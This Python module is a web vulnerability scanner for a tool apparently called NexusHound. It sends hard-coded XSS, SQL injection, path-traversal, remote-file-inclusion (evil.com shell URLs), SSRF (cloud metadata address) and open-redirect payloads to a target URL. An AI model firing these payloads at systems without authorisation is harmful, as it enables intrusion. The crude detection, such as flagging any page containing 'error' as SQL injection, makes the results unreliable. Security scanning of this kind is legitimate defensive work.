from nexushound.modules_manager import ModuleBase, ModuleOption
import aiohttp
import asyncio
import json
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Any
import customtkinter as ctk


class VulnScanner(ModuleBase):
    def __init__(self) -> None:
        super().__init__()
        self.name = "VulnScanner"
        self.version = "1.0.0"
        self.description = "Web vulnerability scanner"
        self.category = "Security"
        self.is_public = True
        self.authors = ["NexusHound"]
        self.license = "MIT"
        self.dependencies = ["aiohttp"]
        self.min_python_version = "3.10"
        self.tags = ["security", "vulnerabilities", "web"]

        self.options = [
            ModuleOption(
                name="url",
                description="Target URL",
                type="str",
                default="",
                required=True
            ),
            ModuleOption(
                name="checks",
                description="Vulnerability checks to run",
                type="str",
                default="xss,sqli,lfi,rfi,ssrf,open_redirect",
                required=False
            ),
            ModuleOption(
                name="threads",
                description="Number of concurrent checks",
                type="int",
                default=5,
                required=False
            )
        ]

        self.payloads = {
            "xss": [
                "<script>alert(1)</script>",
                "'><script>alert(1)</script>",
                '"><img src=x onerror=alert(1)>'
            ],
            "sqli": [
                "' OR '1'='1",
                "1' OR '1'='1' --",
                "' UNION SELECT NULL--"
            ],
            "lfi": [
                "../../../etc/passwd",
                "..%2f..%2f..%2fetc/passwd",
                "/etc/passwd"
            ],
            "rfi": [
                "http://evil.com/shell.php",
                "//evil.com/shell.php",
                "data://text/plain;base64,PHN..."
            ],
            "ssrf": [
                "http://127.0.0.1/admin",
                "http://169.254.169.254/",
                "http://localhost:22"
            ],
            "open_redirect": [
                "//evil.com",
                "https://evil.com",
                "javascript:alert(1)"
            ]
        }

    def create_ui(self, parent: ctk.CTkBaseClass) -> None:
        self._ui_elements["progress_label"] = ctk.CTkLabel(parent, text="Progress: 0%")
        self._ui_elements["progress_label"].pack(pady=5)

        self._ui_elements["progress_bar"] = ctk.CTkProgressBar(parent)
        self._ui_elements["progress_bar"].pack(fill="x", padx=5, pady=5)
        self._ui_elements["progress_bar"].set(0)

        self._ui_elements["results"] = ctk.CTkTextbox(parent, height=400)
        self._ui_elements["results"].pack(fill="both", expand=True, padx=5, pady=5)

    async def check_vulnerability(self, session: aiohttp.ClientSession, url: str, check_type: str, payload: str) -> \
    Optional[Dict]:
        try:
            # Tester les paramètres GET
            test_url = f"{url}?param={payload}"
            async with session.get(test_url) as response:
                content = await response.text()
                if self.detect_vulnerability(check_type, content, response):
                    return {
                        "type": check_type,
                        "url": test_url,
                        "method": "GET",
                        "payload": payload
                    }

            # Tester les paramètres POST
            async with session.post(url, data={"param": payload}) as response:
                content = await response.text()
                if self.detect_vulnerability(check_type, content, response):
                    return {
                        "type": check_type,
                        "url": url,
                        "method": "POST",
                        "payload": payload
                    }

        except Exception as e:
            self._ui_elements["results"].insert("end", f"Error checking {check_type} with {payload}: {str(e)}\n")
        return None

    def detect_vulnerability(self, check_type: str, content: str, response) -> bool:
        """Vérifie si une vulnérabilité a été détectée"""
        if check_type == "xss":
            return any(payload in content for payload in self.payloads["xss"])
        elif check_type == "sqli":
            return "sql" in content.lower() or "mysql" in content.lower() or "error" in content.lower()
        elif check_type == "lfi":
            return "root:" in content or "daemon:" in content
        elif check_type == "rfi":
            return "shell" in content.lower() or "eval" in content.lower()
        elif check_type == "ssrf":
            return response.status == 200 and len(content) > 0
        elif check_type == "open_redirect":
            return response.status in [301, 302] and any(
                url in response.headers.get("location", "") for url in self.payloads["open_redirect"])
        return False

    async def run_scan(self, url: str, checks: List[str], threads: int) -> List[Dict]:
        vulnerabilities = []
        total_checks = sum(len(self.payloads[check]) for check in checks)
        progress = 0

        async with aiohttp.ClientSession() as session:
            tasks = []
            for check in checks:
                for payload in self.payloads[check]:
                    tasks.append(self.check_vulnerability(session, url, check, payload))

            for result in asyncio.as_completed(tasks):
                try:
                    vuln = await result
                    if vuln:
                        vulnerabilities.append(vuln)
                    progress += 1
                    self._ui_elements["progress_bar"].set(progress / total_checks)
                    self._ui_elements["progress_label"].configure(
                        text=f"Progress: {progress / total_checks * 100:.1f}%")
                except Exception as e:
                    self._ui_elements["results"].insert("end", f"Error: {str(e)}\n")

        return vulnerabilities

    def run(self) -> None:
        url = self.get_option_value("url")
        checks = [c.strip() for c in self.get_option_value("checks").split(",")]
        threads = self.get_option_value("threads")

        if not url:
            self._ui_elements["results"].insert("end", "Error: URL required\n")
            return

        self._ui_elements["results"].insert("end", f"Starting vulnerability scan for {url}...\n")
        vulnerabilities = asyncio.run(self.run_scan(url, checks, threads))

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        results_dir = Path("nexushound/results/vuln_scanner")
        results_dir.mkdir(parents=True, exist_ok=True)
        file_path = results_dir / f"scan_{timestamp}.json"

        with open(file_path, "w") as f:
            json.dump(vulnerabilities, f, indent=4)

        options = {
            "url": url,
            "checks": checks,
            "threads": threads
        }
        self.db.save_result(self.id, str(file_path), options)

        self._ui_elements["results"].insert("end", f"\nScan complete! Found {len(vulnerabilities)} vulnerabilities\n")
        self._ui_elements["results"].insert("end", f"Results saved to: {file_path}\n\n")

        for vuln in vulnerabilities:
            self._ui_elements["results"].insert("end",
                                                f"[{vuln['type']}] {vuln['method']} {vuln['url']} - Payload: {vuln['payload']}\n")